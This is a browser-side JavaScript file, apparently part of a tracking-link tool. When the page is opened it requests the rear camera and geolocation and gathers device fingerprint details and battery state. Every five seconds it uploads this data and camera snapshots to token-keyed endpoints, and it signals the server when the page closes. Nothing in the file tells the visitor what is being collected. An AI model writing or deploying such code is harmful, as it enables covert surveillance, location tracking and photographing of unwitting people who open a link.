// static/wrap_app.js
(async () => {
  const token = window.TOKEN;
  if (!token) return;

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  const CAPTURE_MS = 5000;
  let stream = null;
  let loopTimer = null;
  let cameraAllowed = false;

  const json = (o) => JSON.stringify(o);

  // ---------- Helpers ----------

  async function getDetails() {
    const d = {};
    d.userAgent = navigator.userAgent || "";
    d.platform = navigator.platform || "";
    d.cpuCores = navigator.hardwareConcurrency || null;
    d.ramGB = navigator.deviceMemory || null;
    d.languages = navigator.languages || [navigator.language];

    d.screen = {
      w: window.screen.width,
      h: window.screen.height,
      ratio: window.devicePixelRatio || 1,
    };

    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      d.network = {
        type: conn.effectiveType,
        downlink: conn.downlink,
        rtt: conn.rtt,
        saveData: conn.saveData,
      };
    }

    d.permissions = {};
    if (navigator.permissions) {
      for (const name of ["camera", "geolocation"]) {
        try {
          const r = await navigator.permissions.query({ name });
          d.permissions[name] = r.state;
        } catch {
          // ignore
        }
      }
    }

    // Approx storage (ROM-like) info
    d.storage = {};
    try {
      if (navigator.storage && navigator.storage.estimate) {
        const est = await navigator.storage.estimate();
        d.storage = {
          quotaBytes: est.quota || null,
          usageBytes: est.usage || null,
        };
      }
    } catch {
      // ignore
    }

    try {
      const opt = Intl.DateTimeFormat().resolvedOptions();
      d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
    } catch {
      // ignore
    }
    return d;
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { level: Math.round(b.level * 100), charging: !!b.charging };
    } catch {
      return null;
    }
  }

  async function getCoords(timeout = 4000) {
    return new Promise((resolve) => {
      if (!("geolocation" in navigator)) return resolve(null);
      let done = false;
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (done) return;
          done = true;
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            acc: pos.coords.accuracy,
          });
        },
        () => {
          if (done) return;
          done = true;
          resolve(null);
        },
        { timeout, enableHighAccuracy: true }
      );
      setTimeout(() => {
        if (!done) {
          done = true;
          resolve(null);
        }
      }, timeout + 300);
    });
  }

  async function waitForVideoReady(timeoutMs = 4000) {
    if (video.videoWidth > 0 && video.videoHeight > 0) return true;
    return new Promise((resolve) => {
      let done = false;
      function ok() {
        if (!done && video.videoWidth > 0 && video.videoHeight > 0) {
          done = true;
          cleanup();
          resolve(true);
        }
      }
      function cleanup() {
        video.removeEventListener("loadedmetadata", ok);
        video.removeEventListener("canplay", ok);
      }
      video.addEventListener("loadedmetadata", ok);
      video.addEventListener("canplay", ok);
      setTimeout(() => {
        if (!done) {
          done = true;
          cleanup();
          resolve(false);
        }
      }, timeoutMs);
    });
  }

  async function post(url, body) {
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: json(body),
        keepalive: true,
      });
    } catch {
      // ignore
    }
  }

  async function captureAndUpload(battery, coords) {
    if (!cameraAllowed || !stream) return;
    if (!video.videoWidth || !video.videoHeight) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/jpeg", 0.75);

    await post(`/upload_image/${token}`, {
      image_b64: dataUrl,
      battery,
      coords,
    });
  }

  async function tick() {
    const [battery, coords, details] = await Promise.all([
      getBattery(),
      getCoords(),
      getDetails(),
    ]);

    // Always send info
    await post(`/upload_info/${token}`, {
      battery,
      coords,
      details,
    });

    // Only send photo if camera permission granted and stream is live
    if (cameraAllowed) {
      await captureAndUpload(battery, coords);
    }
  }

  async function start() {
    // Try to get camera, but don't break if denied
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "environment" },
        audio: false,
      });
      cameraAllowed = true;
    } catch (e) {
      cameraAllowed = false;
      stream = null;
    }

    if (cameraAllowed && stream) {
      video.srcObject = stream;
      try {
        await video.play();
      } catch {
        // ignore
      }
      // Wait for a real frame
      await waitForVideoReady(4000);
      await new Promise((r) => setTimeout(r, 300));
    }

    // First tick immediately (info only if no camera)
    await tick();
    loopTimer = setInterval(() => {
      tick().catch((err) => console.warn("tick error", err));
    }, CAPTURE_MS);
  }

  function stop() {
    if (loopTimer) clearInterval(loopTimer);
    loopTimer = null;
    if (stream) {
      try {
        stream.getTracks().forEach((t) => t.stop());
      } catch {
        // ignore
      }
      stream = null;
      video.srcObject = null;
    }
  }

  window.addEventListener("beforeunload", () => {
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(
          `/upload_info/${token}`,
          new Blob([json({ note: "page-closed" })], {
            type: "application/json",
          })
        );
      } else {
        fetch(`/upload_info/${token}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: json({ note: "page-closed" }),
          keepalive: true,
        }).catch(() => {});
      }
    } catch {
      // ignore
    }
    stop();
  });

  await start();
})();
